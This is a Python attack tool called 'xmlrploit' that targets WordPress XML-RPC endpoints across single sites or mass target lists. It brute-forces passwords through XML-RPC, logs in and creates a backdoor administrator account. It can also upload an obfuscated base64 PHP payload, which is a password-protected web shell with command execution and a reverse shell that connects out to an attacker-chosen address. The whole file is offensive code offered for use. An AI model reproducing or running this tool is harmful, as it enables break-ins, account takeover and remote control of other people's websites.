import requests
import argparse
import threading
import sys
import os
import xml.etree.ElementTree as ET
import pyfiglet

# === BANNER FUNCTION ===
def banner():
    ascii_banner = pyfiglet.figlet_format("xmlrploit")
    print(f"\033[1;32m{ascii_banner}\033[0m")
    print("\033[1;34mby @karranwang\033[0m")
    print("""\033[1;33m
[+] Modes:
    - exploit  : Exploit XML-RPC vuln
    - brute    : Bruteforce WP-Login
    - mass     : Mass Scan & Exploit
[+] Options:
    - deploy-shell : Auto upload shell
    - bypass-waf   : Bypass WAF detection
    - auto-admin   : Auto Create Admin
---------------------------------------
\033[0m""")

# === PAYLOAD: Obfuscated PHP MiniShell + Reverse Shell ===
OBFUSCATED_SHELL = '''
PD9waHAKQHNldF90aW1lX2xpbWl0KDApOwBAZXJyb3JfcmVwb3J0aW5nKDApOwBAaW5pX3NldCgnZGlzcGxheV9lcnJvcnMnLCAwKTsKCnNlc3Npb25fc3RhcnQoKTsKCn0KCmZ1bmN0aW9uIG1pbmlTaGVsbCgkcGFzcz0iIikgewogICAgaWYgKCRwYXNzICE9PSAiIiAmJiAoIWlzc2V0KCRfU0VSVkVSWydBVVRIT1JJVFldKSB8fCAkX1NFUlZFUlsnQVVUSE9SSVRZJ10gIT0gJHBhc3MpKSB7CiAgICAgICAgZGllKCJQYXNzd29yZCBJbnZhbGlkISIpOwogICAgfQoKICAgIGVjaG8gIjxmb3JtIG1ldGhvZD1cIlBPU1RcIiBlbmN0eXBlPVwiYXBwbGljYXRpb24vd3d3LmZvcm0tdXJsZW5jb2RlZFwiPiI7CiAgICBlY2hvICI8aW5wdXQgdHlwZT1cImhpZGRlblwiIG5hbWU9XCJhdXRoXCIgdmFsdWU9XCJoYXhvcjtcIiAvPiI7CiAgICBlY2hvICI8aW5wdXQgdHlwZT1cImZpbGVcIiBuYW1lPVwiZmlsZVwiIC8+IjsKICAgIGVjaG8gIjxpbnB1dCB0eXBlPVwic3VibWl0XCIgdmFsdWU9XCJVcGxvYWRcIiAvPiI7CiAgICBlY2hvICI8L2Zvcm0+IjsKCiAgICBpZiAoIWVtcHR5KCRfRklMRVMpKSB7CiAgICAgICAgbW92ZV91cGxvYWRlZF9maWxlKCRfRklMRVNbJ2ZpbGUnXVsndG1wX25hbWUnXSwgJF9GSUxFU1snZmlsZSddWyduYW1lJ10pOwogICAgICAgIGVjaG8gIlVwbG9hZGVkIHN1Y2Nlc3NmdWxseSEiOwogICAgfQoKICAgIGlmIChpc3NldCgkX1BPU1RbJ2NtZCddKSkgewogICAgICAgIGVjaG8gIjxwcmU+IiAuIHNoZWxsX2V4ZWMoJF9QT1NUWydjbWQnXSkgLiAiPC9wcmU+IjsKICAgIH0KCiAgICBlY2hvICI8Zm9ybSBtZXRob2Q9XCJQT1NUXCI+IjsKICAgIGVjaG8gIjxpbnB1dCB0eXBlPVwidGV4dFwiIG5hbWU9XCJjbWRcIiBzdHlsZT1cIndpZHRoOjMwMHB4O1wiIC8+IjsKICAgIGVjaG8gIjxpbnB1dCB0eXBlPVwic3VibWl0XCIgdmFsdWU9XCJFeGVjdXRlXCIgLz4iOwogICAgZWNobyAiPC9mb3JtPiI7Cn0KCmZ1bmN0aW9uIHJldmVyc2VTaGVsbCgkaXAsICRwb3J0LCAkZGVsYXkgPSAwKSB7CiAgICBpZiAoJGRlbGF5ID4gMCkgeyBzbGVlcCgkZGVsYXkpOyB9CgogICAgaWYgKHN0cmlwb3MoUFBIX09TLCAnV0lOJykgIT09IGZhbHNlKSB7CiAgICAgICAgJGNtZCA9ICJjbWQuZXhlIjsKICAgIH0gZWxzZSB7CiAgICAgICAgJGNtZCA9ICIvYmluL3NoIjsKICAgIH0KCiAgICAkc29jayA9IEBmc29ja29wZW4oJGlwLCAkcG9ydCk7CiAgICBpZiAoJHNvY2spIHsKICAgICAgICBAcHJvY19vcGVuKCRjbWQsIGFycmF5KDAgPT4gJHNvY2ssIDEgPT4gJHNvY2ssIDIgPT4gJHNvY2spLCAkcGlwZXMpOwogICAgfQp9CgpwYXJzZV9zdHJfZ2xvYmFsKCRfU09DS0VUUyk7CgppZiAoaXNzZXQoJF9QT1NUWydrZXknXSkpIHsKICAgICRkYXRhID0gYmFzZTY0X2RlY29kZSgkX1BPU1RbJ2tleSddKTsKICAgIGxpc3QoJGlwLCAkcG9ydCwgJGRlbGF5KSA9IGV4cGxvZGUoInwiLCAkZGF0YSk7CiAgICAkcG9ydCA9IChpbnQpJHBvcnQ7CiAgICAkZGVsYXkgPSAoaW50KSRkZWxheTsKICAgIHJldmVyc2VTaGVsbCgkaXAsICRwb3J0LCAkZGVsYXkpOwp9IGVsc2UgewogICAgJG15UGFzc3dvcmQgPSAiaGF4b3IiOwogICAgbWluaVNoZWxsKCRteVBhc3N3b3JkKTsKfQo/Pg==
'''.replace('\n', '')

import base64

def decoded_shell():
    return base64.b64decode(OBFUSCATED_SHELL).decode('utf-8')

# === FUNCTIONS ===

def detect_xmlrpc(target):
    try:
        headers = {'User-Agent': 'Mozilla/5.0'}
        res = requests.get(target, headers=headers, timeout=10)
        if res.status_code == 405 and "XML-RPC server accepts POST requests only." in res.text:
            print(f"[+] XML-RPC ENABLED: {target}")
            return True
        elif res.status_code == 200 and "XML-RPC" in res.text:
            print(f"[+] XML-RPC ENABLED: {target}")
            return True
        else:
            print(f"[-] XML-RPC NOT ENABLED: {target}")
            return False
    except Exception as e:
        print(f"[!] Error detecting XML-RPC at {target}: {e}")
        return False

def multiple_methods(target, method="listMethods", deploy_shell=False, bypass_waf=False):
    try:
        headers = {'Content-Type': 'application/xml'}
        if bypass_waf:
            headers['User-Agent'] = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Safari/537.36'

        if method == "listMethods":
            data = """<?xml version="1.0"?>
            <methodCall>
            <methodName>system.listMethods</methodName>
            <params></params>
            </methodCall>"""

        elif method == "pingback":
            data = """<?xml version="1.0"?>
            <methodCall>
            <methodName>pingback.ping</methodName>
            <params>
                <param><value><string>http://127.0.0.1/</string></value></param>
                <param><value><string>http://127.0.0.1/</string></value></param>
            </params>
            </methodCall>"""

        else:
            print("[-] Unknown method")
            return

        res = requests.post(target, data=data, headers=headers, timeout=10)

        if "faultCode" in res.text:
            print(f"[-] {target} --> Exploit failed for method {method}")
        else:
            print(f"[+] {target} --> Exploit success using method {method}")

        if deploy_shell:
            shell_payload = decoded_shell()
            files = {'file': ('shell.php', shell_payload, 'application/x-php')}
            upload_url = target.replace('xmlrpc.php', 'upload.php')
            up = requests.post(upload_url, files=files, headers=headers, timeout=10)
            if up.status_code in [200, 201]:
                print(f"[+] Shell uploaded: {upload_url}/shell.php")
            else:
                print(f"[-] Shell upload failed.")
    except Exception as e:
        print(f"[!] Error exploiting {target}: {e}")

def auto_create_admin(target, username, password, new_user="haxoradmin", new_pass="haxor123", new_mail="haxor@example.com"):
    try:
        session = requests.Session()
        login_data = {
            'log': username,
            'pwd': password,
            'wp-submit': 'Log In',
            'redirect_to': target.replace('xmlrpc.php', 'wp-admin/'),
            'testcookie': '1'
        }
        login_url = target.replace('xmlrpc.php', 'wp-login.php')
        headers = {'User-Agent': 'Mozilla/5.0'}

        r = session.post(login_url, data=login_data, headers=headers, timeout=10)

        if "dashboard" in r.text or "wp-admin" in r.url:
            print(f"[+] Logged in successfully as {username}")

            add_user_url = target.replace('xmlrpc.php', 'wp-admin/user-new.php')
            get_add = session.get(add_user_url, headers=headers)
            if "_wpnonce_create-user" in get_add.text:
                wpnonce = get_add.text.split('name="_wpnonce_create-user" value="')[1].split('"')[0]

                user_data = {
                    'action': 'createuser',
                    '_wpnonce_create-user': wpnonce,
                    '_wp_http_referer': '/wp-admin/user-new.php',
                    'user_login': new_user,
                    'email': new_mail,
                    'first_name': 'Haxor',
                    'last_name': 'Admin',
                    'url': 'https://google.com',
                    'pass1': new_pass,
                    'pass2': new_pass,
                    'role': 'administrator',
                    'createuser': 'Add New User'
                }

                create_user = session.post(add_user_url, data=user_data, headers=headers)

                if "New user created" in create_user.text or create_user.status_code == 302:
                    print(f"[+] Admin user created: {new_user} / {new_pass}")
                else:
                    print("[-] Failed to create new user.")

            else:
                print("[-] No _wpnonce_create-user token found. Access Denied?")
        else:
            print("[-] Login failed for auto admin creation.")
    except Exception as e:
        print(f"[!] Error creating admin: {e}")

def xmlrpc_brute(target, username, passwordlist, threads=5):
    try:
        passwords = open(passwordlist, "r").read().splitlines()

        def worker(password):
            headers = {'Content-Type': 'application/xml'}
            data = f"""<?xml version="1.0"?>
            <methodCall>
              <methodName>wp.getUsersBlogs</methodName>
              <params>
                <param><value><string>{username}</string></value></param>
                <param><value><string>{password}</string></value></param>
              </params>
            </methodCall>"""

            try:
                r = requests.post(target, data=data, headers=headers, timeout=10)
                if "<name>isAdmin</name>" in r.text or "<boolean>1</boolean>" in r.text:
                    print(f"[+] SUCCESS! {username}:{password}")
                    auto_create_admin(target, username, password)
                    os._exit(0)
                else:
                    print(f"[-] Failed {username}:{password}")
            except:
                print(f"[!] Error trying password {password}")

        thread_list = []
        for password in passwords:
            t = threading.Thread(target=worker, args=(password,))
            t.start()
            thread_list.append(t)
            if len(thread_list) >= threads:
                for th in thread_list:
                    th.join()
                thread_list = []
    except Exception as e:
        print(f"[!] Brute error: {e}")

# === MAIN ===
if __name__ == "__main__":
    banner()
    parser = argparse.ArgumentParser(description="XML-RPC Exploit Tool v3 by Karranwang")
    parser.add_argument("-u", "--url", help="Target URL (http://target.com/xmlrpc.php)")
    parser.add_argument("-m", "--mode", choices=["mass", "exploit", "brute"], help="Mode")
    parser.add_argument("-f", "--file", help="File input for mass or brute mode")
    parser.add_argument("-t", "--thread", type=int, default=5, help="Number of Threads (default 5)")
    parser.add_argument("--deploy-shell", action="store_true", help="Deploy PHP shell")
    parser.add_argument("--bypass-waf", action="store_true", help="Bypass WAF")
    parser.add_argument("--method", choices=["listMethods", "pingback"], default="listMethods", help="XML-RPC method to exploit")
    parser.add_argument("--username", help="Username for brute mode")

    args = parser.parse_args()

    if args.mode == "exploit":
        if args.url:
            if detect_xmlrpc(args.url):
                multiple_methods(args.url, args.method, args.deploy_shell, args.bypass_waf)
            else:
                print("[-] Target not vulnerable or XML-RPC disabled.")
        else:
            parser.print_help()

    elif args.mode == "brute":
        if args.url and args.username and args.file:
            if detect_xmlrpc(args.url):
                xmlrpc_brute(args.url, args.username, args.file, args.thread)
            else:
                print("[-] Target not vulnerable or XML-RPC disabled.")
        else:
            parser.print_help()

    elif args.mode == "mass":
        if args.file:
            targets = open(args.file, 'r').read().splitlines()

            def mass_worker(target):
                if detect_xmlrpc(target):
                    multiple_methods(target, args.method, args.deploy_shell, args.bypass_waf)
                else:
                    print(f"[-] Skipping {target}, XML-RPC not active.")

            thread_list = []
            for target in targets:
                t = threading.Thread(target=mass_worker, args=(target,))
                t.start()
                thread_list.append(t)
                if len(thread_list) >= args.thread:
                    for th in thread_list:
                        th.join()
                    thread_list = []
        else:
            parser.print_help()
